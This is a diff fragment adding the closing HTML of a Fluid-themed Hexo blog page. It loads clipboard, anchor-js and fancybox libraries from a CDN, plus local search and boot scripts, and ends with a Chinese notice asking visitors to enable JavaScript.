+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
